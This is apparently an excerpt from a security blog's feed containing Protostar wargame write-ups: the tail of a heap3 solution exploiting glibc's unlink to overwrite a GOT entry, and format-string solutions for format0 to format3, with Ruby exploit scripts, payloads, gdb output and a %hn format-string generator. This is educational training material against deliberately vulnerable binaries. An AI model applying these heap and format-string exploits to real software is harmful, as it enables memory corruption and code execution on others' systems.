sbrk(4096)                                                     = 0x0804c000
sbrk(0)                                                        = 0x0804d000
strcpy(0x0804c008, &ldquo;1&rdquo;)                                        = 0x0804c008
strcpy(0x0804c030, &ldquo;2&rdquo;)                                        = 0x0804c030
strcpy(0x0804c058, &ldquo;3&rdquo;)                                        = 0x0804c058
puts(&ldquo;dynamite failed?&#8221;dynamite failed?
)                                                              = 17
+++ exited (status 17) +++
{% endcodeblock %}</p>

<p>We have three chunks at the appropriate addresses:
{% codeblock %}
(08) 0x0804c000: a-control
(32) 0x0804c008: a</p>

<p>(08) 0x0804c000: b-control
(32) 0x0804c030: b</p>

<p>(08) 0x0804c050: c-control
(32) 0x0804c058: c
{% endcodeblock %}</p>

<p>There are a several great article about this topic, I recommend <a href="http://phrack.org/issues/57/8.html">Phrack 57/8</a>,
<a href="http://phrack.org/issues/57/9.html">Phrack 57/9</a>, <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-11.html">Hackers Hut</a> to
explain the exploitation process in detail.</p>

<p>The malloc chunk could be considered as the following structure:</p>

<p>{% codeblock %}
GNU C Library Implementation (used chunk):</p>

<pre><code>         +----------------------------------+
chunk -&gt; | prev_size                        |
         +----------------------------------+
         | size                         |M|P|
         +----------------------------------+
  mem -&gt; | data                             |
         : ...                              :
         +----------------------------------+
</code></pre>

<p>nextchunk -> | prev_size &hellip;                    |
             :                                  :
{% endcodeblock %}</p>

<p>{% codeblock %}
Once we free() the chunk:</p>

<pre><code>         +----------------------------------+
chunk -&gt; | prev_size                        |
         +----------------------------------+
         | size                         |M|P|
         +----------------------------------+
  mem -&gt; | fd                               |
         +----------------------------------+
         | bk                               |
         +----------------------------------+
         | (old memory, can be zero bytes)  |
         :                                  :
</code></pre>

<p>nextchunk -> | prev_size &hellip;                    |
             :                                  :
{% endcodeblock %}</p>

<p>It is useful to download the <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.2.3.tar.gz">glibc 2.2.3</a> source code, we are
interested, how is the <code>free()</code> implemented:</p>

<p>{% codeblock lang:c malloc/malloc.c %}
..</p>

<h1>define unlink(P, BK, FD)                                                     \</h1>

<p>{                                                                             \
  BK = P->bk;                                                                 \
  FD = P->fd;                                                                 \
  FD->bk = BK;                                                                \
  BK->fd = FD;                                                                \
}                                                                             \
..
  islr = 0;</p>

<p>  if (!(hd &amp; PREV_INUSE))                    /<em> consolidate backward </em>/
  {
    prevsz = p->prev_size;
    p = chunk_at_offset(p, -(long)prevsz);
    sz += prevsz;</p>

<pre><code>if (p-&gt;fd == last_remainder(ar_ptr))     /* keep as last_remainder */
  islr = 1;
else
  unlink(p, bck, fwd);
</code></pre>

<p>  }</p>

<p>  if (!(inuse_bit_at_offset(next, nextsz)))   /<em> consolidate forward </em>/
  {
    sz += nextsz;</p>

<pre><code>if (!islr &amp;&amp; next-&gt;fd == last_remainder(ar_ptr))
                                          /* re-insert last_remainder */
{
  islr = 1;
  link_last_remainder(ar_ptr, p);
}
else
  unlink(next, bck, fwd);

next = chunk_at_offset(p, sz);
</code></pre>

<p>  }
  else
    set_head(next, nextsz);                  /<em> clear inuse bit </em>/</p>

<p>{% endcodeblock %}</p>

<p>To call vulnerable <code>unlink()</code>, we have two branches, consolidate backward or consolidate forward.</p>

<p>We want to overwrite the jump to <code>printf/puts</code> function in <code>GOT</code> table with
the address of <code>winner()</code>.</p>

<p>Given the <code>bck</code> and <code>fwd</code> pointers that we could set arbitrary, <code>free()</code> will do <code>*(fwd+12) = bck</code>
and <code>*(bck+8) = fwd</code>. We use the first assignment to write to the arbitrary memory location.</p>

<p>Because the second assignment, we cannot simply write something to <code>.text</code> section (after <code>winner+0x8</code>),
but jumping to our shellcode stored in allocated memory would be efficient.</p>

<p>{% codeblock %}
gdb> print /x 0x08048864+0x8
$1 = 0x804886c</p>

<p>gdb> maintenance info sections
Exec file:
    `/opt/protostar/bin/heap3&#8217;, file type elf32-i386.
    0x8048114->0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048128->0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048148->0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804816c->0x8048234 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048234->0x804829c at 0x00000234: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804829c->0x804848c at 0x0000029c: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804848c->0x804859a at 0x0000048c: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804859a->0x80485d8 at 0x0000059a: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x80485d8->0x80485f8 at 0x000005d8: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x80485f8->0x8048608 at 0x000005f8: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048608->0x8048680 at 0x00000608: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x8048680->0x80486b0 at 0x00000680: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x80486b0->0x80487b0 at 0x000006b0: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
==> 0x80487b0->0x804abdc at 0x000007b0: .text ALLOC LOAD READONLY CODE HAS_CONTENTS &lt;==
    0x804abdc->0x804abf8 at 0x00002bdc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
    0x804abf8->0x804aca0 at 0x00002bf8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804aca0->0x804aca4 at 0x00002ca0: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
    0x804b000->0x804b008 at 0x00003000: .ctors ALLOC LOAD DATA HAS_CONTENTS
    0x804b008->0x804b010 at 0x00003008: .dtors ALLOC LOAD DATA HAS_CONTENTS
    0x804b010->0x804b014 at 0x00003010: .jcr ALLOC LOAD DATA HAS_CONTENTS
    0x804b014->0x804b0e4 at 0x00003014: .dynamic ALLOC LOAD DATA HAS_CONTENTS
    0x804b0e4->0x804b0e8 at 0x000030e4: .got ALLOC LOAD DATA HAS_CONTENTS
    0x804b0e8->0x804b130 at 0x000030e8: .got.plt ALLOC LOAD DATA HAS_CONTENTS
    0x804b130->0x804b138 at 0x00003130: .data ALLOC LOAD DATA HAS_CONTENTS
    0x804b140->0x804b5d4 at 0x00003138: .bss ALLOC
    0x0000->0x3cfc at 0x00003138: .stab READONLY HAS_CONTENTS
    0x0000->0x566a at 0x00006e34: .stabstr READONLY HAS_CONTENTS
    0x0000->0x0039 at 0x0000c49e: .comment READONLY HAS_CONTENTS
{% endcodeblock %}</p>

<p>Exploit:</p>

<p>{% codeblock lang:ruby exploit-backward.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<h1>user@protostar:~$ objdump -d /opt/protostar/bin/heap3 -M intel</h1>

<h1>&hellip;</h1>

<h1>8048935:       e8 56 fe ff ff          call   8048790 &lt;puts@plt></h1>

<h1>user@protostar:~$ objdump -TR /opt/protostar/bin/heap3 | grep &ldquo;R_386_JUMP_SLOT.* puts&rdquo;</h1>

<h1>0804b128 R_386_JUMP_SLOT   puts</h1>

<h1>gdb> print /x 0x0804b128-0x0c</h1>

<h1>$1 = 0x804b11c</h1>

<h1>user@protostar:~$ nm /opt/protostar/bin/heap3 | grep winner</h1>

<h1>08048864 T winner</h1>

<h1>root@kali32:~# rasm2 -C &lsquo;push 0x08048864; ret&rsquo;</h1>

<h1>&ldquo;\x68\x64\x88\x04\x08\xc3&rdquo;</h1>

<h1>user@protostar:/tmp$ ltrace -e strcpy /opt/protostar/bin/heap3 a b c</h1>

<h1>strcpy(0x0804c008, &ldquo;a&rdquo;)                              = 0x0804c008</h1>

<h1>strcpy(0x0804c030, &ldquo;b&rdquo;)                              = 0x0804c030</h1>

<h1>strcpy(0x0804c058, &ldquo;c&rdquo;)                              = 0x0804c058</h1>

<h1>gdb> print /x 0x0804c008 + 0x04</h1>

<h1>$1 = 0x804c00c</h1>

<p>binary = &ldquo;/opt/protostar/bin/heap3&rdquo;</p>

<h1>chunk1</h1>

<p>argv1  = &ldquo;XXXX&rdquo;                        # user data, later overwritten by second free()
argv1 &lt;&lt; &ldquo;\x68\x64\x88\x04\x08\xc3&rdquo;    # shellcode</p>

<h1>chunk2</h1>

<p>argv2  = &ldquo;X&rdquo; * 24 + &ldquo;\x01&rdquo; + &ldquo;ABCDEFG&rdquo; # user data</p>

<h1>chunk3</h1>

<p>argv2 &lt;&lt; [0xfffffff8].pack(&ldquo;V&rdquo;)        # prev_size = -8 &amp;&amp; PREV_INUSE = 0
argv2 &lt;&lt; [0xfffffffc].pack(&ldquo;V&rdquo;)        # size = -4
argv2 &lt;&lt; [0x44444444].pack(&ldquo;V&rdquo;)        # prev_size(unused) for fake chunk
argv2 &lt;&lt; [0x45454545].pack(&ldquo;V&rdquo;)        # size(unused) for fake chunk
argv2 &lt;&lt; [0x0804b11c].pack(&ldquo;V&rdquo;)        # ret_loc-0x0c
argv2 &lt;&lt; [0x0804c00c].pack(&ldquo;V&rdquo;)        # ret_addr
argv3  = &ldquo;X&rdquo;</p>

<h1><em>(0x0804b11c+12) = 0x0804c00c; </em>(0x0804c00c+8) = 0x0804b11c</h1>

<p>puts %x[ #{binary} &ldquo;#{argv1}&rdquo; &ldquo;#{argv2}&rdquo; &ldquo;#{argv3}&rdquo; ]
{% endcodeblock %}</p>

<p>To explain the logic behind our code, because <code>size</code> has the lowest bit set as
<code>!PREV_INUSE</code> and <code>p</code> points to the beginning of our current chunk, we
triggered the following part of pseudocode with the first <code>free()</code>:</p>

<p>{% codeblock lang:c %}
  if (!(hd &amp; PREV_INUSE))                    /<em> consolidate backward </em>/
  {
    prevsz = -8
    p = chunk_at_offset(p, +8);
    unlink(p, bck, fwd);
  }
{% endcodeblock %}</p>

<p>Here the address of &ldquo;virtual chunk&rdquo; was computed and unlinked:
{% codeblock lang:ruby %}
[0x44444444].pack(&ldquo;V&rdquo;) # prev_size
[0x45454545].pack(&ldquo;V&rdquo;) # size
[0x0804b11c].pack(&ldquo;V&rdquo;) # fwd
[0x0804c00c].pack(&ldquo;V&rdquo;) # bck
{% endcodeblock %}</p>

<p>However, there is another test in consolidate forward:</p>

<p>{% codeblock %}
  if (!(inuse_bit_at_offset(next, nextsz)))   /<em> consolidate forward </em>/
    unlink(next, bck, fwd);</p>

<p>0x08049918 &lt;free+244>:  mov    eax,DWORD PTR [ebp-0x24] ; eax:FFFFFFF8 = -8
0x0804991b &lt;free+247>:  mov    edx,DWORD PTR [ebp-0x28] ; 0x804c04c: &ldquo;DEFG\370\377\377\377\374\377\377\377X&rdquo;
0x0804991e &lt;free+250>:  lea    eax,[edx+eax*1]          ; 0x804c044: &ldquo;XXXX\001ABCDEFG\370\377\377\377\374\377\377\377X&rdquo;
0x08049921 &lt;free+253>:  mov    eax,DWORD PTR [eax+0x4]  ; eax:43424101
0x08049924 &lt;free+256>:  and    eax,0x1                  ; eax:00000001 = PREV_INUSE flag
0x08049927 &lt;free+259>:  mov    DWORD PTR [ebp-0x20],eax ;
0x0804992a &lt;free+262>:  mov    eax,DWORD PTR [ebp-0x28] ; 0x804c04c: &ldquo;DEFG\370\377\377\377\374\377\377\377X&rdquo;
0x0804992d &lt;free+265>:  mov    edx,DWORD PTR [ebp-0x24] ; edx:FFFFFFF8
0x08049930 &lt;free+268>:  mov    DWORD PTR [eax+0x4],edx<br/>
0x08049933 &lt;free+271>:  cmp    DWORD PTR [ebp-0x20],0x0 ; PREV_INUSE set?</p>

<p>{% endcodeblock %}</p>

<p>Here we are verifying, if the <code>PREV_INUSE</code> flag is set <code>(0x43424101)</code>, so we
skipped the forward consolidation:</p>

<p>{% codeblock lang:ruby %}
argv2  = &ldquo;X&rdquo; * 24 + &ldquo;\x01&rdquo; + &ldquo;ABCDEFG&rdquo; # user data
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ /opt/protostar/bin/heap3 $(ruby -e &lsquo;print &ldquo;XXXX&rdquo; + &ldquo;\x68\x64\x88\x04\x08\xc3&rdquo;&rsquo;) $(ruby -e &lsquo;print &ldquo;X&rdquo; * 24 + &ldquo;\x01&rdquo; + &ldquo;ABCDEFG&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + [0x0804b11c].pack(&ldquo;V&rdquo;) + [0x0804c00c].pack(&ldquo;V&rdquo;)&rsquo;) X
that wasn&rsquo;t too bad now, was it? @ 1435304932</p>

<p>user@protostar:/tmp$ ./exploit-backward.rb
that wasn&rsquo;t too bad now, was it? @ 1435304818</p>

<h2>{% endcodeblock %}</h2>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Format Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/28/exploit-exercises-protostar-format-levels/"/>
    <updated>2015-06-28T09:29:15+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/28/exploit-exercises-protostar-format-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<h2>Protostar Format0</h2>

<p>{% codeblock lang:c format0.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void vuln(char *string)
{
  volatile int target;
  char buffer[64];</p>

<p>  target = 0;</p>

<p>  sprintf(buffer, string);</p>

<p>  if(target == 0xdeadbeef) {
      printf(&ldquo;you have hit the target correctly :)\n&rdquo;);
  }
}</p>

<p>int main(int argc, char **argv)
{
  vuln(argv[1]);
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/format0
&hellip;
gdb> disassemble vuln
Dump of assembler code for function vuln:
0x080483f4 &lt;vuln+0>:    push   ebp
0x080483f5 &lt;vuln+1>:    mov    ebp,esp
0x080483f7 &lt;vuln+3>:    sub    esp,0x68
0x080483fa &lt;vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0
0x08048401 &lt;vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
0x08048404 &lt;vuln+16>:   mov    DWORD PTR [esp+0x4],eax
0x08048408 &lt;vuln+20>:   lea    eax,[ebp-0x4c]
0x0804840b &lt;vuln+23>:   mov    DWORD PTR [esp],eax
0x0804840e &lt;vuln+26>:   call   0x8048300 &lt;sprintf@plt>
0x08048413 &lt;vuln+31>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048416 &lt;vuln+34>:   cmp    eax,0xdeadbeef
0x0804841b &lt;vuln+39>:   jne    0x8048429 &lt;vuln+53>
0x0804841d &lt;vuln+41>:   mov    DWORD PTR [esp],0x8048510
0x08048424 &lt;vuln+48>:   call   0x8048330 &lt;puts@plt>
0x08048429 &lt;vuln+53>:   leave<br/>
0x0804842a &lt;vuln+54>:   ret  <br/>
End of assembler dump.</p>

<p>gdb> b *0x08048413
Breakpoint 1 at 0x8048413: file format0/format0.c, line 15.</p>

<p>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
&hellip;
Breakpoint 1, vuln (string=0x41386341 <Address 0x41386341 out of bounds>) at format0/format0.c:15
15  in format0/format0.c</p>

<p>gdb> x /1xw $ebp-0xc
0xbffff6ec: 0x63413163
{% endcodeblock %}</p>

<p>From the output above, we can see:
{% codeblock %}</p>

<h1>addr of &lsquo;int target&rsquo;:</h1>

<p>0x080483fa &lt;vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0</p>

<h1>addr of &lsquo;char *string&rsquo;:</h1>

<p>0x08048401 &lt;vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
0x08048404 &lt;vuln+16>:   mov    DWORD PTR [esp+0x4],eax</p>

<h1>addr of &lsquo;char buffer[64]&rsquo;:</h1>

<p>0x08048408 &lt;vuln+20>:   lea    eax,[ebp-0x4c]
{% endcodeblock %}</p>

<p>Because the pattern <code>0x63413163</code> means offset 64, we could trivially pass the
challenge by overflowing <code>buffer</code> array, because <code>int target</code> follows immediately
(0x4c - 64 = 0xc):</p>

<p>{% codeblock %}
user@protostar:~$ /opt/protostar/bin/format0 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 64 + [0xdeadbeef].pack(&ldquo;V&rdquo;)&rsquo;)
you have hit the target correctly :)
{% endcodeblock %}</p>

<p>This level should be done in less than 10 bytes of input, so let&rsquo;s try similar
approach by overflowing the buffer using format string exploitation.</p>

<p>{% codeblock %}
user@protostar:~$ /opt/protostar/bin/format0 $(ruby -e &lsquo;print &ldquo;%64x&rdquo; + [0xdeadbeef].pack(&ldquo;V&rdquo;)&rsquo;)
you have hit the target correctly :)</p>

<p>user@protostar:~$ ruby -e &lsquo;print &ldquo;%64x&rdquo; + [0xdeadbeef].pack(&ldquo;V&rdquo;)&rsquo; > /tmp/payload</p>

<p>user@protostar:~$ wc -c /tmp/payload
8 /tmp/payload</p>

<p>user@protostar:~$ /opt/protostar/bin/format0 $(cat /tmp/payload)
you have hit the target correctly :)
{% endcodeblock %}</p>

<h2>Protostar Format1</h2>

<p>{% codeblock lang:c format1.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int target;</p>

<p>void vuln(char *string)
{
  printf(string);</p>

<p>  if(target) {
      printf(&ldquo;you have modified the target :)\n&rdquo;);
  }
}</p>

<p>int main(int argc, char **argv)
{
  vuln(argv[1]);
}
{% endcodeblock %}</p>

<p>We want to write something to global variable <code>target</code>, stored in <code>bss</code> section. It has fixed address:
{% codeblock %}
user@protostar:~$ objdump -t /opt/protostar/bin/format1 | grep target
08049638 g     O .bss   00000004              target</p>

<p>user@protostar:~$ nm /opt/protostar/bin/format1 | grep target
08049638 B target
{% endcodeblock %}</p>

<p>To find the <code>DDDD = 0x44444444</code> on the stack, after a few tries we have:
{% codeblock %}
user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print &#8220;DDDD&rdquo; + &ldquo; %p&rdquo; * 200&rsquo;)&ldquo;
DDDD 0x804960c 0xbffff528 0x8048469 0xb7fd8304 0xb7fd7ff4 0xbffff528 0x8048435 0xbffff718 0xb7ff1040 0x804845b 0xb7fd7ff4 0x8048450 (nil) 0xbffff5a8 0xb7eadc76 0x2 0xbffff5d4 0xbffff5e0 0xb7fe1848 0xbffff590 0xffffffff 0xb7ffeff4 0x804824d 0x1 0xbffff590 0xb7ff0626 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 (nil) (nil) 0xbffff5a8 0xcec48558 0xe4969348 (nil) (nil) (nil) 0x2 0x8048340 (nil) 0xb7ff6210 0xb7eadb9b 0xb7ffeff4 0x2 0x8048340 (nil) 0x8048361 0x804841c 0x2 0xbffff5d4 0x8048450 0x8048440 0xb7ff1040 0xbffff5cc 0xb7fff8f8 0x2 0xbffff6fd 0xbffff718 (nil) 0xbffff975 0xbffff983 0xbffff997 0xbffff9b8 0xbffff9cb 0xbffff9de 0xbffff9e8 0xbffffed8 0xbfffff16 0xbfffff2a 0xbfffff39 0xbfffff4a 0xbfffff52 0xbfffff62 0xbfffff6f 0xbfffffa3 0xbfffffb2 0xbfffffcf (nil) 0x20 0xb7fe2414 0x21 0xb7fe2000 0x10 0xfabfbff 0x6 0x1000 0x11 0x64 0x3 0x8048034 0x4 0x20 0x5 0x7 0x7 0xb7fe3000 0x8 (nil) 0x9 0x8048340 0xb 0x3e9 0xc (nil) 0xd 0x3e9 0xe 0x3e9 0x17 0x1 0x19 0xbffff6db 0x1f 0xbfffffe1 0xf 0xbffff6eb (nil) (nil) (nil) (nil) (nil) 0xd4000000 0x72facad1 0x50139897 0x39f1f921 0x695501e9 0x363836 (nil) (nil) (nil) 0x706f2f00 0x72702f74 0x736f746f 0x2f726174 0x2f6e6962 0x6d726f66 0x317461 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print &#8220;DDDD&rdquo; + &ldquo; %p&rdquo; * 140&rsquo;)&ldquo;
DDDD 0x804960c 0xbffff5e8 0x8048469 0xb7fd8304 0xb7fd7ff4 0xbffff5e8 0x8048435 0xbffff7cc 0xb7ff1040 0x804845b 0xb7fd7ff4 0x8048450 (nil) 0xbffff668 0xb7eadc76 0x2 0xbffff694 0xbffff6a0 0xb7fe1848 0xbffff650 0xffffffff 0xb7ffeff4 0x804824d 0x1 0xbffff650 0xb7ff0626 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 (nil) (nil) 0xbffff668 0x9cacbe0e 0xb6ff281e (nil) (nil) (nil) 0x2 0x8048340 (nil) 0xb7ff6210 0xb7eadb9b 0xb7ffeff4 0x2 0x8048340 (nil) 0x8048361 0x804841c 0x2 0xbffff694 0x8048450 0x8048440 0xb7ff1040 0xbffff68c 0xb7fff8f8 0x2 0xbffff7b1 0xbffff7cc (nil) 0xbffff975 0xbffff983 0xbffff997 0xbffff9b8 0xbffff9cb 0xbffff9de 0xbffff9e8 0xbffffed8 0xbfffff16 0xbfffff2a 0xbfffff39 0xbfffff4a 0xbfffff52 0xbfffff62 0xbfffff6f 0xbfffffa3 0xbfffffb2 0xbfffffcf (nil) 0x20 0xb7fe2414 0x21 0xb7fe2000 0x10 0xfabfbff 0x6 0x1000 0x11 0x64 0x3 0x8048034 0x4 0x20 0x5 0x7 0x7 0xb7fe3000 0x8 (nil) 0x9 0x8048340 0xb 0x3e9 0xc (nil) 0xd 0x3e9 0xe 0x3e9 0x17 0x1 0x19 0xbffff79b 0x1f 0xbfffffe1 0xf 0xbffff7ab (nil) (nil) (nil) (nil) (nil) 0xd3000000 0xaf79b817 0x53b8b1a3 0x6ce5252 0x69b1ee44 0x363836 0x706f2f00 0x72702f74 0x736f746f 0x2f726174 0x2f6e6962 0x6d726f66 0x317461 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD %140\$x&rdquo;
DDDD 78243034</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD %139\$x&rdquo;
DDDD 31252044</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD %138\$x&rdquo;
DDDD 44444400</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD  %138\$x&rdquo;
DDDD  44444444</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print &#8220;DDDD  %138\$x&rdquo;&rsquo;)&ldquo;
DDDD  44444444</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print [0x44444444].pack(&#8220;V&rdquo;) + &ldquo;  %138\$x&rdquo;&rsquo;)&ldquo;
DDDD  44444444</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print [0x08049638].pack(&#8220;V&rdquo;) + &ldquo;  %138\$x&rdquo;&rsquo;)&ldquo;
8  8049638</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print [0x08049638].pack(&#8220;V&rdquo;) + &ldquo;  %138\$n&rdquo;&rsquo;)&ldquo;
8  you have modified the target :)
{% endcodeblock %}</p>

<h2>Protostar Format2</h2>

<p>{% codeblock lang:c format2.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int target;</p>

<p>void vuln()
{
  char buffer[512];</p>

<p>  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);</p>

<p>  if(target == 64) {
      printf(&ldquo;you have modified the target :)\n&rdquo;);
  } else {
      printf(&ldquo;target is %d :(\n&rdquo;, target);
  }
}</p>

<p>int main(int argc, char **argv)
{
  vuln();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD&rdquo; + &ldquo; %p&rdquo; * 10&rsquo; | /opt/protostar/bin/format2
DDDD 0x200 0xb7fd8420 0xbffff5d4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070target is 0 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD %4\$p&rdquo;&rsquo; | /opt/protostar/bin/format2
DDDD 0x44444444target is 0 :(</p>

<p>user@protostar:~$ nm /opt/protostar/bin/format2 | grep target
080496e4 B target</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$p&rdquo;&rsquo; | /opt/protostar/bin/format2
 0x80496e4target is 0 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
 target is 5 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$x %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
 80496e4 target is 13 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$61x %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
                                                       80496e4 target is 67 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$58x %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
                                                    80496e4 you have modified the target :)
{% endcodeblock %}</p>

<h2>Protostar Format3</h2>

<p>{% codeblock lang:c format3.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int target;</p>

<p>void printbuffer(char *string)
{
  printf(string);
}</p>

<p>void vuln()
{
  char buffer[512];</p>

<p>  fgets(buffer, sizeof(buffer), stdin);</p>

<p>  printbuffer(buffer);</p>

<p>  if(target == 0x01025544) {
      printf(&ldquo;you have modified the target :)\n&rdquo;);
  } else {
      printf(&ldquo;target is %08x :(\n&rdquo;, target);
  }
}</p>

<p>int main(int argc, char **argv)
{
  vuln();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD&rdquo; + &ldquo; %p&rdquo; * 25&rsquo; | /opt/protostar/bin/format3
DDDD (nil) 0xbffff590 0xb7fd7ff4 (nil) (nil) 0xbffff798 0x804849d 0xbffff590 0x200 0xb7fd8420 0xbffff5d4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520target is 00000000 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD %12\$p&rdquo;&rsquo; | /opt/protostar/bin/format3
DDDD 0x44444444target is 00000000 :(</p>

<p>user@protostar:~$ nm /opt/protostar/bin/format3 | grep target
080496f4 B target
{% endcodeblock %}</p>

<p>We need to rewrite the address at <code>0x080496f4</code> with the value <code>0x01025544</code>. For this purpose we prepare simple ruby script to calculate the exact format string:</p>

<p>{% codeblock lang:ruby formatter.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<p>def check_param(fmt)
    return if fmt =~ /\d+:0x\h+:0x\h+/
    puts &ldquo;syntax: #{$0} &lt;position:target_address:shellcode_address>&rdquo;
    exit
end</p>

<p>fmt = ARGV[0]
check_param(fmt)</p>

<p>offset, target_addr, shellcode_addr = fmt.split(&ldquo;:&rdquo;)</p>

<h1>get high / low ordered bytes, remove 0x prefix</h1>

<p>hob = shellcode_addr[2,4].to_i(16)
lob = shellcode_addr[6,4].to_i(16)
addr = target_addr[2,8]
o = offset.to_i</p>

<p>a = []
if (hob > lob)
    f = lob - 8; s = hob - lob; a &lt;&lt; addr; a &lt;&lt; &ldquo;%08x&rdquo; % (addr.to_i(16)+2)
else
    f = hob - 8; s = lob - hob; a &lt;&lt; &ldquo;%08x&rdquo; % (addr.to_i(16)+2); a &lt;&lt; addr
end</p>

<p>puts &ldquo;ruby -e &lsquo;print [0x#{a[0]}].pack(&#34;V\&rdquo;) + [0x#{a[1]}].pack(\&ldquo;V\&rdquo;) + \&ldquo;%#{o}\$#{f}x%#{o}\$hn%#{o+1}\$#{s}x%#{o+1}\$hn\&rdquo;&rsquo;&ldquo;
{% endcodeblock %}</p>

